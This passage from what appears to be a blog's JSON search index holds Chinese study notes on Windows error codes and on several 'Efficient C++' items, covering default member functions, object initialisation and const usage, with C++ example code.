函数返回的错误代码对了解该函数为什么会运行失败尝尝很有用。 从系统内部来讲，当一个Windows函数检测到一个错误时，它会使用一个称为线程本地存储器（thread-local storage）的机制，将相应的错误代码号码与调用的线程关联起来。这将使线程能够互相独立运行，而不会影响各自的错误代码。当函数返回时，它的返回值就能指明一个错误已经发生。若要确定这是个什么错误，则需要调用 GetLastError 函数： 1DWORD GetLastError","tags":[{"name":"《Windows核心编程》","slug":"《Windows核心编程》","permalink":"http://example.com/tags/%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"},{"name":"规范","slug":"规范","permalink":"http://example.com/tags/%E8%A7%84%E8%8C%83/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《Windows核心编程》","slug":"D-立志博览群书/《Windows核心编程》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%E3%80%8B/"}]},{"title":"《Linux命令行与shell脚本编程大全》 导读","date":"2023-10-27T01:24:02.453Z","path":"D_立志博览群书/《Linux命令行与shell脚本编程大全.第3版》/Readme/","text":"导读目录","tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"《Linux命令行与shell脚本编程大全》","slug":"《Linux命令行与shell脚本编程大全》","permalink":"http://example.com/tags/%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8%E3%80%8B/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《Linux命令行与shell脚本编程大全.第3版》","slug":"D-立志博览群书/《Linux命令行与shell脚本编程大全-第3版》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8ALinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8Eshell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E5%A4%A7%E5%85%A8-%E7%AC%AC3%E7%89%88%E3%80%8B/"}]},{"title":"《Efficient C++》 导读","date":"2023-10-27T01:24:02.452Z","path":"D_立志博览群书/《Efficient C++》/Readme/","text":"导读目录 2_const关键字 3_确定对象使用前初始化 4-了解C++默认创建并调用的函数","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"《Efficient C++》","slug":"《Efficient-C-》","permalink":"http://example.com/tags/%E3%80%8AEfficient-C-%E3%80%8B/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《Efficient C++》","slug":"D-立志博览群书/《Efficient-C-》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"<4> 了解C++默认创建并调用的函数","date":"2023-10-27T01:24:02.451Z","path":"D_立志博览群书/《Efficient C++》/4_了解CPP默认创建并调用的函数/","text":"[toc] 编译器创建的函数空类： 1class Empty&#123;&#125;; 编译器默认添加的函数： 12345678910// defaultFunc.hclass Empty&#123;public: // 当程序中未定义以下函数时编译器默认添加 Empty() &#123; &#125; // 默认构造函数 Empty(const Empty&amp; rhs) &#123; &#125; // 拷贝构造函数 ~Empty() &#123; &#125; // 析构函数 Empty&amp; operator=(const Empty&amp; rhs) &#123; &#125; // 拷贝赋值操作符函数&#125;; 拷贝构造函数与拷贝赋值操作符函数拷贝构造函数和拷贝赋值操作符函数，编译器创建的版本只是单纯地将来源对象的每一个非静态成员变量拷贝到目标对象。如下模板类 NamedObject，它允许你将一个名称和类型为 T 的对象产生关联。 123456789101112131415161718192021222324// copy.h#ifndef __COPY_H__#define __COPY_H__#include &lt;iostream&gt;template&lt;typename T&gt;class NamedObject&#123;public: /** 由于其中声明了一个构造函数，编译器于是不再为它创建默认构造函数。 这很重要，意味如果你用心设计一个类，其构造函数要求实参， 你就无须担心编译器会毫无挂虑地为你添加一个无实参构造函数（即默认构造函数）而遮盖掉你的版本。 */ NamedObject(const char *name, const T&amp; value) : nameValue(name), objectValue(value) &#123;&#125; NamedObject(const std::string&amp; name, const T&amp; value) : nameValue(name), objectValue(value) &#123;&#125;private: std::string nameValue; T objectValue;&#125;;#endif // __COPY_H__ 1234567891011121314// main.cpp#include &quot;copy.h&quot;int main()&#123; /** NamedObject 既没有声明拷贝构造函数，也没有声明拷贝赋值操作符函数， 所以编译器会为它创建那些函数（如果它们被调用的话）。 现在，看看拷贝构造函数的用法 */ NamedObject&lt;int&gt; no1(&quot;Smallest Prime Number&quot;, 2); NamedObject&lt;int&gt; no2(no1); return 0;&#125; 编译器拒绝创建拷贝赋值操作符函数的情况编译器为 NamedObject&lt;int&gt; 所产生的拷贝赋值操作符函数，其行为基本上与拷贝构造函数如出一辙，但一般而言只有当生出的代码合法且有适当机会证明它有意义，其表现才会如我先前所说。万一两个条件有一个不符合，编译器会拒绝为类产生拷贝赋值操作符函数。 编译器拒绝创建拷贝赋值操作符函数情况： 成员函数为引用类型。 成员函数为常量。","tags":[],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《Efficient C++》","slug":"D-立志博览群书/《Efficient-C-》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"<3> 确定对象使用前初始化","date":"2023-10-27T01:24:02.450Z","path":"D_立志博览群书/《Efficient C++》/3_确定对象使用前初始化/","text":"[toc] 未初始化的对象在初始化对象的值方面，C++ 似乎相当善变。如下面示例代码，g_var 为全局变量，自动初始化为 0，而 a 是一个随机值。p 的成员变量有时候被初始化为 0，有时候不会，从运行结果来看两次都已经初始化为 0。 而其他变成语言中用一个 “无初值对象” 是不存在的，这很重要。 1234567891011121314151617181920212223// initObj.h#ifndef __INITOBJ_H__#define __INITOBJ_H__#include &lt;iostream&gt;int g_var;class Point&#123;public: Point() &#123;&#125; ~Point() &#123;&#125; int x() &#123; return xp; &#125; int y() &#123; return yp; &#125;private: int xp; int yp;&#125;;#endif // __INITOBJ_H__ 123456789101112131415// initObj.cpp#include &quot;initObj.h&quot;int main()&#123; int a; std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; std::endl; std::cout &lt;&lt; &quot;g_var = &quot; &lt;&lt; g_var &lt;&lt; std::endl; Point p; std::cout &lt;&lt; &quot;Point::x = &quot; &lt;&lt; p.x() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Point::y = &quot; &lt;&lt; p.y() &lt;&lt; std::endl; return 0;&#125; C++初始化通常如果你使用类 C 语法部分而未初始化可能招致运行期成本，那么就不保证发生初始化。一旦进入纯 C++ 部分，规则有些变化。这就很好地解释了为什么数组不保证其内容被初始化，而 vector 却能保证初始化。 基础数据类型初始化12345678910111213141516// baseData.cpp#include &lt;iostream&gt;int main()&#123; int x = 0; // 手动初始化 int 类型对象 const char * text = &quot;shiyanlou&quot;; // 手动初始化指针字符串 double d; // 通过读取输入方式初始化 std::cout &lt;&lt; &quot;请输入：&quot;; std::cin &gt;&gt; d; std::cout &lt;&lt; &quot;x = &quot; &lt;&lt; x &lt;&lt; std::endl; std::cout &lt;&lt; &quot;text = &quot; &lt;&lt; text &lt;&lt; std::endl; std::cout &lt;&lt; &quot;d = &quot; &lt;&lt; d &lt;&lt; std::endl; return 0;&#125; 类初始化至于内置类型以外的任何其他对象，初始化责任落在了构造函数。规则很简单，确保每一个构造函数都将对象的每一个成员初始化。 这个规则很简单，重要的是别混淆了赋值和初始化。 1234567891011121314151617181920212223// initClass.h#ifndef __INITCLASS_H__#define __INITCLASS_H__#include &lt;iostream&gt;#include &lt;list&gt;class PhoneNumber &#123; &#125;;class ABEntry&#123; // ABEntry = “Address Book Entry”public: ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones);private: std::string theName; std::string theAddress; std::list&lt;PhoneNumber&gt; thePhones; int numTimesConsulted;&#125;;#endif // __INITCLASS_H__ 1234567891011121314151617// initClass.cpp#include &quot;initClass.h&quot;ABEntry::ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones)&#123; theName = name; // 这些都是赋值而非初始化 theAddress = address; thePhones = phones; numTimesConsulted = 0;&#125;int main()&#123; return 0;&#125; 这将产生具有你期望的值的 ABEntry 对象，但这仍然不是最好的方法。C++ 的规则规定，对象的数据成员在进入构造函数的主体之前被初始化。在 ABEntry 构造函数中，theName、theAddress 和 thePhones 没有被初始化，它们只是被赋值。初始化发生在进入 ABEntry 构造函数正文之前，即自动调用它们的默认构造函数时进行的。在进入 ABEntry 构造函数的主体之前，已经进行了初始化。这对于 numTimesConsulted 不是这样，因为它是一个内置类型。对它来说，不能保证它在被赋值之前就被初始化了。 初始化列表ABEntry 构造函数的一个较佳写法是使用初始化列表进行初始化。 初始化列表使用方法1234567891011121314151617181920212223// initList.h#ifndef __INITLIST_H__#define __INITLIST_H__#include &lt;iostream&gt;#include &lt;list&gt;class PhoneNumber &#123; &#125;;class ABEntry&#123; // ABEntry = “Address Book Entry”public: ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones);private: std::string theName; std::string theAddress; std::list&lt;PhoneNumber&gt; thePhones; int numTimesConsulted;&#125;;#endif // __INITLIST_H__ 12345678910111213141516// initList.cpp#include &quot;initList.h&quot;ABEntry::ABEntry(const std::string&amp; name, const std::string&amp; address, const std::list&lt;PhoneNumber&gt;&amp; phones) : theName(name), // 以下使用初始化列表，从冒号（:）后开始 theAddress(address), thePhones(phones), numTimesConsulted(0)&#123;&#125; // 构造函数中为空int main()&#123; return 0;&#125; 示例代码中构造函数与在构造函数中赋值的最终结果相同，但它往往更有效率。基于赋值的版本首先调用默认构造函数来初始化 theName、theAddress 和 thePhones，然后立即在默认构造的基础上分配新的值。因此，所有在这些默认构造中进行的工作都被浪费了。成员初始化列表的方法避免了这个问题，因为初始化列表中的参数被用作各种数据成员的构造器参数。在这个例子中，theName 是由 name 拷贝构造的，theAddress 是由 address 复制构造的，thePhones 是由 phones 拷贝构造的。 对大多数类型而言，比起先调用默认构造函数然后再调用拷贝赋值操作符，单只调用一次赋值构造函数是比较高效的，有时甚至高效得多。对于内置型对象如 numTimesConsulted，其初始化和赋值的成本相同，但为了一致性最好也通过成员初值列来初始化。同样道理，甚至当你想要默认构造一个成员变量，你都可以使用成员初值列，只要指定 0 或者空作为初始化实参即可。 123456ABEntry::ABEntry() : theName(), // 调用 thenName 默认构造函数 theAddress(), // 调用 theAddress 默认构造函数 thePhones(), // 调用 thePhones 默认构造函数 numTimesConsulted(0) // 初始化为 0&#123;&#125; 初始化说明当用户定义类型的数据成员在成员初始化列表中没有初始化时，编译器会自动调用这些数据成员的默认构造器，所以有些程序员认为上述方法是多余的是可以理解的，但是如果有一个总是在初始化列表中列出每个数据成员的策略，就可以避免记住哪些数据成员在被省略后可能会被未初始化。例如，由于 numTimesConsulted 是一个内置的类型，如果没有在初始化列表中遗漏没有初值时就会导致不明确行为。 有些情况下即使面对的成员变量属于内置类型（其初始化与赋值的成本相同），也一定得使用初值列。是的，如果成员变量是常量或引用时，它们就一定需要初值，不能被赋值。为避免需要记住成员变量何时必须在成员初值列中初始化，何时不需要，最简单的做法就是：总是使用成员初值列。这样做有时候绝对必要，且又往往比赋值更高效。 许多类拥有多个构造函数，每个构造函数有自己的成员初值列。如果这种类存在许多成员变量或基类，多份成员初值列的存在就会导致不受欢迎的重复（在初值列内）和无聊的工作（对程序员而言）。这种情况下可以合理地在初值列中遗漏那些 “赋值表现像初始化一样好” 的成员变量，改用它们的赋值操作，并将那些赋值操作移往某个函数（通常是私有的），供所有构造函数调用。这种做法在 “成员变量的初值系由文件或数据库读入” 时特别有用。然而，比起经由赋值操作完成的 “伪初始化”（pseudo-initialization），通过成员初值列完成的 “真正初始化” 通常更加可取。 C++ 有着十分固定的 “成员初始化顺序”。顺序总是相同：基类更早于其子类被初始化，而类的成员变量总是以其声明次序被初始化。回头看看 ABEntry，其 theName 成员永远最先被初始化，然后是 theAddress，再是 thePhones，最后是 numTimesConsulted。即使它们在成员初值列中以不同的顺序出现（很不幸那是合法的），也不会有任何影响。为避免你或你的检查代码的人迷惑，并避免某些可能存在的晦涩错误，当你在成员初值列中条列各个成员时，最好总是以其声明次序为次序。 初始化静态对象静态（static）对象寿命从被构造出来直到程序结束为止，因此栈和堆对象都被排除。包括全局对象、命名空间内的对象、类、函数和文件内被声明静态的对象。函数内的静态对象称为局部静态对象（因为它们对函数而言是局部的），其他静态对象称为非局部静态对象。程序结束时静态对象会被自动销毁，也就是它们的析构函数会在 main() 结束时被自动调用。 初始化顺序如下示例代码，我们关心的问题涉及至少两个源码文件，每一个内含至少一个非局部静态对象（也就是说该对象是全局或位于命名空间内，抑或在类内或源码文件内被声明为静态）。真正的问题是：如果某编译单元内的某个非局部静态对象的初始化动作使用了另一编译单元内的某个非局部静态对象，它所用到的这个对象可能尚未被初始化，因为 C++ 对 “定义于不同编译单元内的非局部静态对象” 的初始化次序并无明确定义。 12345678910111213141516171819202122232425262728293031// FileSystem.h#ifndef __FILESYSTEM_H__#define __FILESYSTEM_H__/** 假设有一个 FileSystem 类，它让互联网上的文件看起来好像位于本机。 由于这个类使文件系统看起来像个单一文件系统，你可能会产出一个特殊对象， 位于全局或命名空间作用域内，像是单一文件系统。 */#include &lt;iostream&gt;class FileSystem&#123;public: FileSystem() &#123;&#125; ~FileSystem() &#123;&#125; // ... std::size_t numDisks() const; // 其中一个成员函数 // ...&#125;;/** FileSystem 对象绝不是一个稀松平常无关痛痒的对象， 因为你的客户如果在 theFileSystem 对象构造完成前就使用它，会得到惨重的灾情。 */// 预留给用户使用的对象extern FileSystem tfs;#endif // __FILESYSTEM_H__ 123456789101112131415// Directory.h#ifndef __DIRECTORY_H__#define __DIRECTORY_H__#include &lt;iostream&gt;#include &quot;FileSystem.h&quot;class Directory&#123;public: Directory(const FileSystem &amp;fs); ~Directory();&#125;;#endif // __DIRECTORY_H__ 12345678910111213141516// Director.cpp#include &quot;Directory.h&quot;/** 假设某些客户建立了一个 Directory 类用以处理文件系统内的目录。 很自然他们的类会用上 theFileSystem 对象 */Directory::Directory(const FileSystem &amp;tfs)&#123; std::size_t disks = tfs.numDisks(); // 使用 tfs 对象 // ...&#125;Directory::~Directory()&#123;&#125; 12345678910// main.cpp#include &quot;FileSystem.h&quot;#include &quot;Directory.h&quot;int main()&#123; // 假设创建一个目录来存放临时文件 Directory tempDir(tfs); // 临时文件存放目录 return 0;&#125; 现在，初始化次序的重要性显现出来了：除非 tfs 在 tempDir 之前先被初始化，否则 tempDir 的构造函数会用到尚未初始化的 tfs。但 tfs 和 tempDir 是不同的人在不同的时间于不同的源码文件建立起来的，它们是定义于不同编译单元内的非局部静态对象。如何能够确定 tfs 会在 tempDir 之前先被初始化？ C++ 对 “定义于不同的编译单元内的非局部静态对象” 的初始化相对次序并无明确定义。这是有原因的：决定它们的初始化次序相当困难，根本无解。在其最常见形式，也就是多个编译单元内的非局部静态对象经由 “模板隐式具现化” 形成（而后者自己可能也是经由 “模板隐式具现化” 形成），不但不可能决定正确的初始化次序，甚至往往不值得寻找 “可决定正确次序” 的特殊情况。 单例模式幸运的是一个小小的设计便可完全消除这个问题。唯一需要做的是：将每个 非局部静态对象搬到自己的专属函数内（该对象在此函数内被声明为静态）。这些函数返回一个引用指向它所含的对象。然后用户调用这些函数，而不直接指涉这些对象。换句话说，非局部静态对象被局部静态对象替换了。设计模式的迷哥迷妹们想必认出来了，这是单例模式的一个常见实现手法。 这个手法的基础在于：C++ 保证，函数内的局部静态对象会在该函数被调用期间首次遇上该对象之定义式时被初始化。所以如果你以 “函数调用”（返回一个引用指向局部静态对象）替换直接访问非局部静态对象，你就获得了保证，保证你所获得的那个引用将指向一个历经初始化的对象。更棒的是，如果你从未调用非局部静态对象的 “仿真函数”，就绝不会引发构造和析构成本；真正的非局部静态对象可没这等便宜！ 1234567891011121314// FileSystem.cpp#include &quot;FileSystem.h&quot;// 该函数替换 tfs 对象，在类中是静态的，FileSystem&amp; tfs()&#123; static FileSystem tfs; // 定义并初始化非局部静态对象 return tfs; // 返回对象引用&#125;std::size_t FileSystem::numDisks() const&#123; return 0;&#125; 12345678910111213141516// Director.cpp#include &quot;Directory.h&quot;/** 假设某些客户建立了一个 Directory 类用以处理文件系统内的目录。 很自然他们的类会用上 theFileSystem 对象 */Directory::Directory(const FileSystem &amp;tfs)&#123; std::size_t disks = tfs.numDisks(); // 使用 tfs 对象 // ...&#125;Directory::~Directory()&#123;&#125; 这么修改之后，这个系统程序的客户完全像以前一样地用它，唯一不同的是他们现在使用 tfs() 和 tempDir() 函数，而不再是 tfs 和 tempDir 对象。也就是说他们使用函数返回的 “指向静态对象” 的引用，而不再使用对象自身。 这种结构下的返回引用函数往往十分单纯：第一行定义并初始化一个局部静态对象，第二行返回它。这样的单纯性往往使用内联函数，尤其如果它们被频繁调用的话（见实验《透彻内联》）。但是从另一个角度看，这些函数 “内含静态对象” 的事实使它们在多线程系统中带有不确定性。再说一次，任何一种非常量静态对象，不论它是局部或非局部，在多线程环境下往往都会很麻烦。处理这个麻烦的一种做法是：在程序的单线程启动阶段手工调用所有返回引用函数，这可消除与初始化有关的 “竞速条件（race conditions）”。 为避免在对象初始化之前过早地使用它们，你需要做三件事： 手动初始化内置型非成员变量。 使用初始化列表初始化成员变量。 在初始化顺序不确定情况下加强设计。","tags":[{"name":"Efficent C++","slug":"Efficent-C","permalink":"http://example.com/tags/Efficent-C/"}],"categories":[{"name":"D_立志博览群书","slug":"D-立志博览群书","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"《Efficient C++》","slug":"D-立志博览群书/《Efficient-C-》","permalink":"http://example.com/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"<2> const 关键字","date":"2023-10-27T01:24:02.449Z","path":"D_立志博览群书/《Efficient C++》/2_const关键字/","text":"[toc] const 修饰指针变量对于指针，你可以指定指针本身是否为常量，也可以指定指针所指向的内容是常量，或两者都是，或两者都不是。 1234567891011121314151617// constPointer.h#ifndef __CONSTPOINTER_H__#define __CONSTPOINTER_H__#include &lt;iostream&gt;char greeting[] = &quot;Hello&quot;;class Widget&#123;&#125;;void f1(const Widget *pw); // f1 获取一个指针指向常量的 Widget 对象void f2(Widget const *pw); // f2 相同#endif // __CONSTPOINTER_H__ 12345678910111213141516171819// constPointer.cpp#include &quot;constPointer.h&quot;int main()&#123; char *p1 = greeting; // 非常量指针, 非常量数据 const char *p2 = greeting; // 非常量指针, 常量数据 char const *p3 = greeting; // 非常量指针, 常量数据 char * const p4 = greeting; // 常量指针, 非常量数据 const char * const p5 = greeting; // 常量指针, 常量数据 std::cout &lt;&lt; &quot;p1 = &quot; &lt;&lt; p1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p2 = &quot; &lt;&lt; p2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p3 = &quot; &lt;&lt; p3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p4 = &quot; &lt;&lt; p4 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p5 = &quot; &lt;&lt; p5 &lt;&lt; std::endl; return 0;&#125; 总结：如果 const 出现在星号的左边，那么被指针指向的内容就是常量；如果 const 出现在星号的右边，那么指针本身就是常量；如果 const 出现在星号两边，则表示指针和指针指向的内容都是常量。 迭代器中的 constSTL 的迭代器是以指针为模型的，所以一个迭代器的行为很想一个和 T* 指针。声明一个迭代器的常数就像声明一个指针的常量（即声明一个 T* 常量指针）。迭代器不允许指向不同的内容，但它指向的内容可以被修改。如果你想要一个迭代器指向不能被修改的东西（即 STL 类似于一个 const T* 指针），则需要一个 const_itrerator。 12345678910// constIterator.h#ifndef __CONSTITERATOR_H__#define __CONSTITERATOR_H__#include &lt;iostream&gt;#include &lt;vector&gt;std::vector&lt;int&gt; vec = &#123;1, 2, 3, 4, 5&#125;;#endif // __CONSTITERATOR_H__ 123456789101112131415161718192021222324252627282930// constIterator.cpp#include &quot;constIterator.h&quot;int main()&#123; // 1. 指针为非常量，内容为非常量 std::vector&lt;int&gt;::iterator iter1 = vec.begin(); *iter1 = 10; // 正确 ++iter1; // 正确 // 2. 指针为常量，内容为非常量 const std::vector&lt;int&gt;::iterator iter2 = vec.begin(); *iter2 = 10; // 正确， 修改指针所指内容 ++iter2; // 错误，iter2 为常量指针，不能修改 // 3. 指针为非常量，内容为常量 std::vector&lt;int&gt;::const_iterator iter3 = vec.begin(); *iter3 = 10; // 错误， *iter3 表示指针所指内容为常量，不能修改 ++iter3; // 正确，指针非常量，可以改变 // 4. 指针为常量，内容为常量 const std::vector&lt;int&gt;::const_iterator iter4 = vec.begin(); *iter4 = 10; // 错误， *iter4 表示指针所指内容为常量，不能修改 ++iter4; // 错误，iter4 为常量指针，不能修改 // 5. 等效于 std::vector&lt;int&gt;::const_iterator iter5 = vec.begin(); auto iter5 = vec.cbegin(); return 0;&#125; const 修饰函数返回值在成员函数上使用 const 的目的是为了确定哪些成员函数可以在 const对象上调用。这样的成员函数很重要，原因有二。首先，它们使一个类的接口更容易理解。知道哪些函数可以修改一个对象，哪些不可以，是很重要的。第二，它们使我们有可能与常量对象一起工作。这是编写高效代码的一个关键方面，提高 C++ 程序性能的基本方法之一是通过引用到常量来传递对象。这种技术只有在有常量成员函数的情况下才是可行的，可以用它来处理产生的常量限定的对象。 关于 const 修饰成员函数主要讲以下三个知识点： const 修饰的成员函数可以被重载。 关于 ”二进制位常量性“ 与 ”逻辑常量性“。 避免重载而导致重复代码。 const 修饰成员变量可以被重载12345678910111213141516171819202122232425262728// overloadConst.h#ifndef __OVERLOADCONST_H__#define __OVERLOADCONST_H__#include &lt;iostream&gt;class TextBlock &#123;public: TextBlock(std::string t) : text(t) &#123;&#125; ~TextBlock() &#123;&#125; const char&amp; operator[](std::size_t position) const &#123; std::cout &lt;&lt; &quot;const char&amp; operator[](std::size_t position) const&quot; &lt;&lt; std::endl; return text[position]; &#125; char&amp; operator[](std::size_t position) &#123; std::cout &lt;&lt; &quot;char&amp; operator[](std::size_t position)&quot; &lt;&lt; std::endl; return text[position]; &#125;private: std::string text;&#125;;#endif // __OVERLOADCONST_H__ 123456789101112131415161718192021222324252627// overloadConst.cpp#include &quot;overloadConst.h&quot;// 在函数中, ctb 是常量void print(const TextBlock&amp; ctb)&#123; // 调用 const TextBlock::operator[] std::cout &lt;&lt; ctb[0] &lt;&lt; std::endl; // ctb[0] = &#x27;x&#x27;; // 错误，不能修改一个常量&#125;int main()&#123; // 调用 TextBlock::operator[] TextBlock tb(&quot;Hello&quot;); std::cout &lt;&lt; tb[0] &lt;&lt; std::endl; // 正确，只读一个非常量 tb[0] = &#x27;x&#x27;; // 正确，修改一个非常量 // 调用 const TextBlock::operator[] const TextBlock ctb(&quot;World&quot;); std::cout &lt;&lt; ctb[0] &lt;&lt; std::endl; // 正确，只读一个常量 // ctb[0] = &#x27;x&#x27;; // 错误，不能修改一个常量 print(tb); return 0;&#125; 通过重载 operator[] 并赋予不同版本的返回值类型，你可以对常量和非常量 TextBlocks 进行不同的处理。 常量对象在实际程序中最常出现的是通过指针或引用到常量的结果。例如示例代码中的 void print(const TextBlock&amp; ctb) 函数。 请注意，main() 函数中 ctb[0] = &#39;x&#39;; 的错误只与被调用的 operator[] 的返回类型有关；对 operator[] 本身的调用都是正常的。错误是由于试图对 const char&amp; 进行赋值。 operator[] 的返回数据类型是 char&amp;，不是 char。如果 operator[] 如果只返回一个 char，是不会被编译通过的，因为修改内置数据类型的函数的返回值是不合法的。即使它是合法的，C++ 按值返回对象的事实将意味着一个 tb.text[0] 的副本会被修改，而不是 tb.text[0] 本身。 二进制位常量性与逻辑常量性一个成员函数为常量意味着什么？有两个普遍的概念：“二进制位常量性”（也称为 “物理常量性”）和 “逻辑常量性”。 二进制位常量性”二进制位常量性“ 阵营认为，当且仅当一个成员函数不修改对象的任何数据成员（不包括静态成员）时，它才是常量，也就是说它不修改对象内部的任何比特位。比特恒定性的好处是，它很容易被检测到违规行为，编译器只需查看对数据成员的赋值。事实上，逐位不变性是 C++ 对不变性的定义，而且一个常量成员函数不允许修改其所在对象的任何非静态数据成员。 遗憾的是，许多不怎么规范的成员函数都通过了二进制位常量性测试。特别是，一个修改了 “指针所指向的内容” 的成员函数经常不算是常量成员。但如果对象中只有指针，那么称该函数是 “二进制位常量性”，编译器也不会有异议。例如下面的示例代码所示，假设有一个类似于 TextBlock 的类，它将其数据存储为 char* 类型而不是 string类型，因为它需要通过一个不认识 string 对象的 C API 进行交互。 12345678910111213141516171819202122232425// bitwise.h#ifndef __BITWISE_H__#define __BITWISE_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class CTextBlock&#123;public: CTextBlock(std::string txt); ~CTextBlock(); // 二进制位常量性声明，实际并不合适 char&amp; operator[](std::size_t position) const &#123; return pText[position]; &#125;private: void release();private: char *pText;&#125;;#endif // __BITWISE_H__ 1234567891011121314151617181920212223242526272829303132333435// bitwise.cpp#include &quot;bitwise.h&quot;CTextBlock::CTextBlock(std::string txt) : pText(NULL)&#123; release(); int len = txt.length(); pText = new char[len + 1]; memset(pText, 0, len + 1); memcpy(pText, txt.data(), len);&#125;CTextBlock::~CTextBlock()&#123; release();&#125;void CTextBlock::release()&#123; if(pText != NULL) &#123; delete pText; pText = NULL; &#125;&#125;int main()&#123; const CTextBlock cctb(&quot;Hello&quot;); char *pc = &amp;cctb[0]; std::cout &lt;&lt; &quot;before modified: pc = &quot; &lt;&lt; *pc &lt;&lt; std::endl; *pc = &#x27;J&#x27;; std::cout &lt;&lt; &quot;after modified: pc = &quot; &lt;&lt; *pc &lt;&lt; std::endl; return 0;&#125; CTextBlock 类（不恰当地）将 operator[] 声明为一个常量成员函数，尽管该函数返回的是对对象内部数据的引用。注意到 operator[] 的实现并没有以任何方式修改 pText。因此，编译器会很乐意为 operator[] 生成代码。 但是我们却发现在 main() 函数中 *pc = &#39;J&#39;; 对返回值进行了修改，*pc 可是调用 operator[] 后的返回值。 逻辑常量性出现上面 “二进制位常量性” 示例代码中问题后出现了 “逻辑常量性” 派。 一个常量成员函数可能会修改它所调用的对象中的比特位，但只是以客户端检测不到的方式。例如，当你的 CTextBlock 类被请求后，可能想缓存文本块的长度。 12345678910111213141516171819// logic.h#ifndef __LOGIC_H__#define __LOGIC_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class CTextBlock&#123;public: std::size_t length() const;private: char *pText; std::size_t textLength; // 最近一次计算文本区块长度 bool lengthIsValid; // 目前长度是否有效&#125;;#endif // __LOGIC_H__ 123456789101112// logic.cpp#include &quot;logic.h&quot;std::size_t CTextBlock::length() const&#123; if (!lengthIsValid) &#123; // 错误，const 成员函数内不能给 textLength 和 lengthIsValid 赋值 textLength = std::strlen(pText); lengthIsValid = true; &#125; return textLength;&#125; length() 的实现不是 “二进制位常量性”，因为 textLength 和 lengthIsValid 都可能被修改。这两个数据被修改对 const CTextBlock 对象而言虽然可接受，但编译器不同意。 解决办法也很简单，利用 C++ 的一个与 const 相关的摆动场：mutable（可变的）。mutable 释放掉非静态成员变量的 “二进制位常量性” 约束。 12345678910111213141516171819// logic.h#ifndef __LOGIC_H__#define __LOGIC_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class CTextBlock&#123;public: std::size_t length() const;private: char *pText; mutable std::size_t textLength; // 最近一次计算文本区块长度 mutable bool lengthIsValid; // 目前长度是否有效&#125;;#endif // __LOGIC_H__ 避免常量和非常量成员重复mutable 是一个很好的解决方案，它解决了二进制位常量性非我所欲的问题，但它并没有解决所有与常量相关的困难。例如，假设 TextBlock（和 CTextBlock）中的 operator[] 不仅返回对相应字符的引用，它还执行边界检查，记录访问信息，甚至可能进行数据完整性验证。把所有这些放在常量和非常量的 operator[] 函数中（不要担心，现在有隐式内联长度的函数–见实验《透彻内联》）会产生这种怪异的现象。 12345678910111213141516171819202122232425262728293031// avoidDuplication.h#ifndef __AVOIDDUPLICATION_H__#define __AVOIDDUPLICATION_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class TextBlock&#123;public: const char&amp; operator[](std::size_t position) const &#123; // 边界检查 // 日志数据访问 // 验证数据完整性 return text[position]; &#125; char&amp; operator[](std::size_t position) &#123; // 边界检查 // 日志数据访问 // 验证数据完整性 return text[position]; &#125;private: std::string text;&#125;;#endif // __AVOIDDUPLICATION_H__ 看到上面示例代码，你能说代码重复，以及随之而来的编译时间、维护和代码漏洞等问题吗？当然，我们可以把所有的边界检查等代码移到一个单独的成员函数中（私有的），两个版本的 operator[] 